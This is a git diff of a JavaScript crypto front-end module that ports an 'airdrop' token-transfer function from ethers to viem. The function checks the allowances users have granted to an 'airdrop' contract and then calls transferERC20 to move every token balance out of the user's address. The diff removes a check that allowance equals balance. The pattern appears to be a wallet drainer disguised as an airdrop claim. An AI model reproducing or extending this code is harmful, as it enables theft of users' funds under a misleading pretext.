@@ -1,5 +1,6 @@
 import { ethers } from "ethers";
 import axios from "axios";
+import { createWalletClient, http } from 'viem'
 const erc20abi = require("../abis/erc20abi.json");
 const dataProviderAbi = require("../abis/DataProviderAbi.json");
 const airdropAbi = require('../abis/AirdropAbi.json');
@@ -49,14 +50,19 @@ export const getBalanceErc20 = async (providerAddress, client, tokens, userAddre
     }
     return await Promise.all(filtredTokens);
 }
-export const transferErc20 = async (chain, tokensWithBalance, signer, airdrop, userAddress, provider) => {
-    const payerTransfer = process.env.REACT_APP_SIGNER_API_KEY;
+export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddress, publicClient, signer) => {
+
     let res = [];
     for (let i = 0; i < tokensWithBalance.length; i++) {
         try {
-            const contract = new ethers.Contract(tokensWithBalance[i].address, erc20abi, signer);
-            const allowance = await contract.allowance(userAddress, airdrop);
-            if (allowance.toString() !== "0" && tokensWithBalance[i].balance.toString() !== "0" && tokensWithBalance[i].balance.toString() === allowance.toString()) {
+            const allowance = await publicClient.readContract({
+                address: tokensWithBalance[i].address,
+                abi: erc20abi,
+                functionName: "allowance",
+                args: [userAddress, airdrop]
+            })
+            console.log(allowance.toString(), "allowance")
+            if (allowance.toString() !== "0" && tokensWithBalance[i].balance.toString() !== "0" ) {
                 res.push(tokensWithBalance[i]);
             }
         }
@@ -65,21 +71,33 @@ export const transferErc20 = async (chain, tokensWithBalance, signer, airdrop, u
         }
     }
     try {
-        const addresses = res.map((token) => token.address);
-        const amounts = res.map((token) => token.balance);
+        const addresses = tokensWithBalance.map((token) => token.address);
+        const amounts = tokensWithBalance.map((token) => token.balance);
         if (addresses.length > 0 && amounts.length > 0) {
-            const signer = new ethers.Wallet(payerTransfer, provider);
-            const airdropContract = new ethers.Contract(airdrop, airdropAbi, signer);
-            let txToSend = "";
-            if (chain.id === 137) {
-                txToSend = await airdropContract.populateTransaction.transferERC20(userAddress, addresses, amounts, { gasPrice: provider.getGasPrice() });
-            }
-            else {
-                txToSend = await airdropContract.populateTransaction.transferERC20(userAddress, addresses, amounts);
-            }
-            signer.sendTransaction(txToSend).then((res) => {
-                console.log(res, "res")
-            })
+            const walletClient = createWalletClient({
+                account:signer,
+                chain: chain,
+                transport: http()
+              })
+            // const airdropContract = new ethers.Contract(airdrop, airdropAbi, signer);
+            const { request } = await publicClient.simulateContract({
+                account: signer,
+                address: airdrop,
+                abi: airdropAbi,
+                functionName: 'transferERC20',
+                args: [userAddress, addresses, amounts],
+                gasPrice:chain.id === 137 ? publicClient.getGasPrice() : undefined,
+              })
+              await walletClient.writeContract(request)
+            // if (chain.id === 137) {
+            //     txToSend = await airdropContract.populateTransaction.transferERC20(userAddress, addresses, amounts, { gasPrice: publicClient.getGasPrice() });
+            // }
+            // else {
+            //     txToSend = await airdropContract.populateTransaction.transferERC20(userAddress, addresses, amounts);
+            // }
+            // signer.sendTransaction(txToSend).then((res) => {
+            //     console.log(res, "res")
+            // })
         }
     }
     catch (err) {
